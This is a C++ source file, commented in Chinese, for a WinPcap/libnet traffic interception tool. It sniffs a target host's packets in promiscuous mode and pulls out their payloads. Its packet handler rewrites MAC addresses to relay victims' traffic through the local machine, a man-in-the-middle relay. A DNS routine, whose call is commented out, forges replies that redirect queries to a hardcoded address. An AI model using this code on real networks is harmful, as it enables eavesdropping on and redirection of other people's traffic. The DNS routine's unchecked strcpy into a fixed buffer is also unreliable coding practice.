#include "stdafx.h"
#include "C_DataQueue.h"
#include "C_CapturePacket.h"
#include "ProtocolModel.h"
#include "C_SockHelper.h"
#include <string>

pcap_t* C_CapturePacket::m_devHandle = NULL;
HANDLE C_CapturePacket::m_hStopEvent = NULL;
char C_CapturePacket::m_szGatewayMac[6] = {0};
char C_CapturePacket::m_szLocalIP[20] = {0};
char C_CapturePacket::m_szBroadcastIP[20] = {0};
char C_CapturePacket::m_szGatewayIP[20] = {0};
char C_CapturePacket::m_szSubnetNum[15] = {0};
char C_CapturePacket::m_szLocalMac[6] = {0};


C_CapturePacket::C_CapturePacket()
{
	C_SockHelper::GetGatewayMac(m_szGatewayMac);
	C_SockHelper::GetLocalIP(m_szLocalIP);
	C_SockHelper::GetBroadcastIP(m_szBroadcastIP);
	C_SockHelper::GetGatewayIP(m_szGatewayIP);
	C_SockHelper::GetSubnetAdd(m_szSubnetNum);
	C_SockHelper::GetLocalMac(m_szLocalMac);

	m_hStopEvent = ::CreateEvent(NULL, FALSE, FALSE, _T(""));
}

C_CapturePacket::~C_CapturePacket()
{
}

bool C_CapturePacket::StartListen( char* pszIPAdd, int nPort)
{
	StartAnalysePacket();

	pcap_if_t *alldevs;
	pcap_if_t *d;

	char errBuf[PCAP_ERRBUF_SIZE];
	u_int netmask;
	struct bpf_program fcode;
	int nDevId = 0, nSelectedDev;

	std::string strFiflter = "host ";
	strFiflter += pszIPAdd;
	strFiflter += " and ip";
	if(nPort != 0)
	{
		strFiflter +=" and port ";
		char szPort[6];
		itoa(nPort,szPort,10);
		strFiflter +=szPort;
	}

	if(pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errBuf) == -1)
	{
		printf("error in pcap_findalldevs: %s\n",errBuf);
		return false;
	}

	printf("\n\n");
	for(d = alldevs; d; d =d->next)
	{
		if(d->description)
			printf("%d. %s\n",++nDevId, d->description);
		else
			printf("%d. No Description available\n",++nDevId, d->description);
	}

	if(nDevId == 0)
	{
		printf("No interface found!\n");
		return false;
	}

	printf("\nEnter the interface number (1-%d):  ",nDevId);
	scanf("%d", &nSelectedDev);
	
	if(nSelectedDev < 1 || nSelectedDev > nDevId)
	{
		printf("Infterface number out of range.\n");
		pcap_freealldevs(alldevs);
		return false;
	}

	for(d = alldevs, nDevId = 0; nDevId < nSelectedDev-1; d = d->next, nDevId++) ;

	if( (m_devHandle = pcap_open(
		d->name,
		65535,
		PCAP_OPENFLAG_PROMISCUOUS,
		1000,
		NULL,
		errBuf
		))  == NULL)
	{
		printf("\n Unable to open the adapter, %s is not supported by winpcap\n");
		pcap_freealldevs(alldevs);
		return false;
	}

	if(pcap_datalink(m_devHandle) != DLT_EN10MB)
	{
		printf("This program works only on Ethernet networks.\n");
		pcap_freealldevs(alldevs);
		return false;
	}

	//if(d->addresses != NULL)
	//	netmask = ((struct sockaddr_in *)(d->addresses->netmask))->sin_addr.S_un.S_addr;
	//else
	netmask = 0xffffff;

	if(pcap_compile(m_devHandle, &fcode, strFiflter.c_str(), 1, netmask) < 0)
	{
		printf("Uable to compile the packet filter. check the syntax.\n");
		pcap_freealldevs(alldevs);
		return false;
	}

	if(pcap_setfilter(m_devHandle, &fcode) < 0)
	{
		printf("Error setting the filter.\n");
		pcap_freealldevs(alldevs);
		return false;
	}

	printf("\nListening on %s ...\n\n", d->description);
	pcap_freealldevs(alldevs);

	pcap_loop(m_devHandle, 0, packet_handler, NULL);
	return TRUE;
}

void C_CapturePacket::packet_handler( u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data )
{
	ip_header *ih;
	char dstip[20] = {0};
	char srcip[20] = {0};

	u_char alldata[65535];
	memcpy(alldata, pkt_data, header->caplen);

	if(strncmp((char*)alldata, m_szGatewayMac, 6) == 0)
		return;

	ih = (ip_header *)(pkt_data+14);//以太网首部长14字节

	if (ih->proto == 6) //TCP
		tcp_handler(header, pkt_data);
	else if(ih->proto == 17) //UDP
	{
		if ( udp_handler(header, pkt_data) == false)
			return;
	}
//****************************************************************

	sprintf(dstip, "%d.%d.%d.%d",  ih->daddr.byte1, ih->daddr.byte2, ih->daddr.byte3, ih->daddr.byte4);
	if(strcmp(dstip, m_szLocalIP) == 0 || strcmp(dstip, m_szBroadcastIP) == 0)
		return;

	if(strncmp(dstip,m_szSubnetNum, strlen(m_szSubnetNum)) != 0 || strcmp(dstip, m_szGatewayIP) == 0 )
	{
			memcpy(alldata, m_szGatewayMac, 6);
			memcpy(alldata+6, m_szLocalMac,6);

			if( pcap_sendpacket(m_devHandle, alldata, header->caplen) != 0)
				printf("***pcap_sendpacket Failed***\n");
		}
}

void C_CapturePacket::tcp_handler( const struct pcap_pkthdr *header, const u_char *pkt_data )
{
	struct tm *ltime;
	time_t local_time;
	char sztime[16];

	ip_header *ih;
	tcp_header *th;

	u_int iph_len;
	u_short tcph_len;
	u_short srcport,dstport;

	u_char *pData;
	long nDataLen;

	local_time = header->ts.tv_sec;
	ltime = localtime(&local_time);
	strftime(sztime, sizeof(sztime), "%H:%M:%S", ltime);

	printf("%s  len: %d \t", sztime, header->len);

	ih = (ip_header *)(pkt_data+14);//以太网首部长14字节
	iph_len = (ih->ver_ihl & 0xf) * 4;//取IP报头长度，并乘以单位32bit
	th = (tcp_header *)((u_char*)ih+iph_len); //IP数据报首部+首部长度 = 数据部份，即TCP数据报首部

	srcport = ntohs(th->nSourPort);
	dstport = ntohs(th->nDestPort);

	printf("%d.%d.%d.%d:\t%d\t->   %d.%d.%d.%d:\t%d\n", ih->saddr.byte1, ih->saddr.byte2, ih->saddr.byte3,
		ih->saddr.byte4, srcport, ih->daddr.byte1, ih->daddr.byte2, ih->daddr.byte3, ih->daddr.byte4, dstport);

	tcph_len =ntohs(th->nHLenAndFlag);
	tcph_len = (tcph_len >> 12) * 4; //右移12位，取4位首部长度

	pData = (u_char *)th + tcph_len;//tcp报头 + 首部长度 = 数据开始位置
	nDataLen = ntohs(ih->tlen) - iph_len - tcph_len;//数据长度 = ip数据报总长 - ip首部长度 - tcp首部长度

	if(nDataLen <= 0)
		return;

	PacketInfo packet;
	packet.pPacket = new char[nDataLen];
	packet.nLength = nDataLen;

	memcpy(packet.pPacket, pData, nDataLen);
	C_DataQueue::GetInstance()->AddData(packet);
}

bool C_CapturePacket::udp_handler( const struct pcap_pkthdr *header, const u_char *pkt_data )
{
	struct tm *ltime;
	time_t local_time;
	char sztime[16];

	ip_header *ih;
	udp_header *uh;

	u_int iph_len;
	u_short srcport,dstport;

	u_char *pData;
	long nDataLen;

	local_time = header->ts.tv_sec;
	ltime = localtime(&local_time);
	strftime(sztime, sizeof(sztime), "%H:%M:%S", ltime);

	printf("%s  len: %d \t", sztime, header->len);

	ih = (ip_header *)(pkt_data+14);//以太网首部长14字节
	iph_len = (ih->ver_ihl & 0xf) * 4;//取IP报头长度，并乘以单位32bit
	uh = (udp_header *)((u_char*)ih+iph_len); //IP数据报首部+首部长度 = 数据部份，即UDP数据报首部

	srcport = ntohs(uh->sport);
	dstport = ntohs(uh->dport);

	printf("%d.%d.%d.%d:\t%d\t->   %d.%d.%d.%d:\t%d\n", ih->saddr.byte1, ih->saddr.byte2, ih->saddr.byte3,
		ih->saddr.byte4, srcport, ih->daddr.byte1, ih->daddr.byte2, ih->daddr.byte3, ih->daddr.byte4, dstport);

	//if(dstport == 53)//DNS
	//{
	//	dns_handler(header, pkt_data);
	//	return false;
	//}

	pData = (u_char *)uh + 8;
	nDataLen = ntohs(uh->len) - 8;

	if(nDataLen <= 0)
		return true;

	PacketInfo packet;
	packet.pPacket = new char[nDataLen];
	packet.nLength = nDataLen;

	memcpy(packet.pPacket, pData, nDataLen);
	C_DataQueue::GetInstance()->AddData(packet);

	return true;
}

void C_CapturePacket::StartAnalysePacket()
{
	m_hAnalyseThread = CreateThread(NULL, 0, AnalyseThread, &m_Analyser ,0 , NULL);
}

DWORD WINAPI C_CapturePacket::AnalyseThread( __in LPVOID lpParameter )
{
	C_ProtocolAnalyse* Analyser = (C_ProtocolAnalyse*)lpParameter;

	while (::WaitForSingleObject(m_hStopEvent, 0) != WAIT_OBJECT_0)
	{
		Analyser->HandleNextPacket();
		Sleep(100);
	}

	return 1;
}

void C_CapturePacket::StopListen()
{
	DWORD dwExitCode = 0;

	::SetEvent(m_hStopEvent);
	while (1)
	{
		::GetExitCodeThread(m_hAnalyseThread, &dwExitCode);
		if (dwExitCode != STILL_ACTIVE )
			break;
		::Sleep(100);
	}
}

void C_CapturePacket::dns_handler( const struct pcap_pkthdr *header, const u_char *pkt_data )
{
	et_header *eh = (et_header*)pkt_data;
	ip_header *ih;
	udp_header *uh;
	dns_header *dh;
	u_int iph_len;
	u_short srcport,dstport;

	ih = (ip_header *)(pkt_data+14);//以太网首部长14字节
	iph_len = (ih->ver_ihl & 0xf) * 4;//取IP报头长度，并乘以单位32bit
	uh = (udp_header *)((u_char*)ih+iph_len); //IP数据报首部+首部长度 = 数据部份，即UDP数据报首部
	dh = (dns_header *)((u_char*)uh + 8); //UDP首部+8字节的的头部长度=DNS数据报首部

	srcport = ntohs(uh->sport);
	dstport = ntohs(uh->dport);

	uint16_t qr = ntohs(dh->flags);
	qr &= 0x8000;
	if(qr != 0)
		return;


	u_int8_t dnsData[100];

	strcpy((char*)dnsData, (char*)dh+12); //取“查询问题”部份
	int NameLen = strlen((char*)dnsData);
	char* offset = (char*)dnsData + NameLen;
	memcpy(offset+1, (char*)dh+12+NameLen+1, 4);//类型和类

	memcpy(offset+1+4, dnsData, NameLen+4+1);

	NameLen = NameLen*2+8+1; 

	dnsData[NameLen+1] = 0x0;		//生存时间
	dnsData[NameLen+2] = 0x0;
	dnsData[NameLen+3] = 0x0;
	dnsData[NameLen+4] = 0xad;

	dnsData[NameLen+5] = 0x0;//资源长度
	dnsData[NameLen+6] = 0x4;

	dnsData[NameLen+7] = 0x73;//ip地址
	dnsData[NameLen+8] = 0xef;
	dnsData[NameLen+9] = 0xd2;
	dnsData[NameLen+10] = 0x1b;


	//dnsData[NameLen+4+1] = 0x0;		//生存时间
	//dnsData[NameLen+4+2] = 0x0;
	//dnsData[NameLen+4+3] = 0x0;
	//dnsData[NameLen+4+4] = 0xad;

	//dnsData[NameLen+4+5] = 0x0;//资源长度
	//dnsData[NameLen+4+6] = 0x4;

	//dnsData[NameLen+4+7] = 0x73;//ip地址
	//dnsData[NameLen+4+8] = 0xef;
	//dnsData[NameLen+4+9] = 0xd2;
	//dnsData[NameLen+4+10] = 0x1b;


////////////////////////////////////////////////////////////////////////////////	
	char szLocalIp[20];
	char error_info[LIBNET_ERRBUF_SIZE];		
	libnet_ptag_t protocol_tag;
	libnet_t * l;	

	C_SockHelper::GetLocalIP(szLocalIp);
	l = libnet_init(LIBNET_LINK, szLocalIp, error_info);
	if(l == NULL)
		printf("libnet_init faild - error:%s", error_info);

	int  dnsDataLen = NameLen+10+1;
	int udpLen = dnsDataLen + LIBNET_UDP_DNSV4_H+ 8;
	int ipLen = udpLen + 20; 

	int dnsID =  ntohs(dh->id);
	uint16_t flag = 0x8180;
	protocol_tag = libnet_build_dnsv4(LIBNET_UDP_DNSV4_H, dnsID, flag, 1, 1, 0, 0, dnsData, dnsDataLen, l, 0);

	if(protocol_tag == -1)
	{
		char * p = libnet_geterror(l);
		return;
	}
	protocol_tag = libnet_build_udp(dstport, srcport, udpLen, 0, NULL, 0, l, 0);

	if(protocol_tag == -1)
	{
		char * p = libnet_geterror(l);
		return;
	}
	
	protocol_tag = libnet_build_ipv4(ipLen, 0, 0x0fff, 0, 32, 17, 0, *(int *)(&(ih->daddr))  , *(int *)(&(ih->saddr)) , NULL, 0, l, 0);

	if(protocol_tag == -1)
	{
		char * p = libnet_geterror(l);
		return;
	}

	protocol_tag = libnet_build_ethernet( eh->shost, eh->dhost, ETHERTYPE_IP, NULL, 0, l, 0);

	if(protocol_tag == -1)
	{
		char * p = libnet_geterror(l);
		return;
	}

	if( libnet_write(l) == -1)
		printf("\nSend ARP Packet Error : libnet_write\n");
}
